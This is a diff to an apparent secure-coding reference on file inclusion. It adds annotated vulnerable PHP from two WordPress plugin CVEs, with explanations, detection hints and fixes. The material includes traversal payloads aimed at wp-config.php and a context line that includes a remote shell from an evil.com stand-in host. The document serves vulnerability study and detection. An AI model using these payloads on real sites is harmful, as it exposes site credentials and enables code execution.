@@ -158,6 +158,46 @@ include($_GET['url']);  // http://evil.com/shell.txt if RFI enabled
 
 ---
 
+## Real-World CVE Patterns
+
+### CVE-2022-0320: Essential Addons for Elementor — LFI via strpos() Without realpath()
+**Impact:** Unauthenticated LFI → RCE, CVSS 9.8 (1M+ installations)
+
+```php
+// AJAX handler loads template — user controls path components
+$template_info = $_REQUEST['templateInfo'];
+$file_path = sprintf('%s/Template/%s/%s',
+    $dir_path,
+    $template_info['name'],      // User-controlled
+    $template_info['file_name']  // User-controlled
+);
+// Containment check WITHOUT realpath() — BYPASSABLE
+if (!$file_path || 0 !== strpos($file_path, $dir_path)) {
+    wp_send_json_error('Invalid template');
+}
+include($file_path);  // ../../../wp-config.php or uploaded PHP file
+```
+
+**Why vulnerable:** `strpos($file_path, $dir_path)` checks the RAW string which still starts with `$dir_path` even when `../` sequences are embedded. `realpath()` must be called BEFORE the containment check to resolve traversal sequences. Without it, `$dir_path . "/Template/../../wp-config.php"` passes the check.
+**Detection:** `include`/`require` with user input where path validation uses `strpos()` without `realpath()`. Also `sanitize_text_field()` on file paths — it does NOT strip `../`.
+
+### CVE-2022-1392: ShopLentor — Template Parameter Without Allowlist
+**Impact:** Unauthenticated LFI, CVSS 7.5
+
+```php
+// Elementor widget renders template from user-controlled $style parameter
+$style = $settings['style'];  // Controllable via AJAX/Elementor
+$template_path = PLUGIN_PATH . '/templates/' . $style . '.php';
+if (file_exists($template_path)) {
+    include($template_path);  // LFI: style=../../../../wp-config
+}
+```
+
+**Why vulnerable:** No allowlist validation on `$style` — any string accepted. The `.php` suffix is appended but `../` traversal still works. Fix: `sanitize_key()` (allows only `[a-z0-9_-]`) + strict allowlist array + `realpath()` containment check.
+**Detection:** Template/layout/style parameters flowing into `include()` or `load_template()`. Look for `file_exists()` as the ONLY validation — it confirms the path exists but doesn't validate it's within the intended directory.
+
+---
+
 ## Attack Techniques
 
 ### 1. Basic Path Traversal
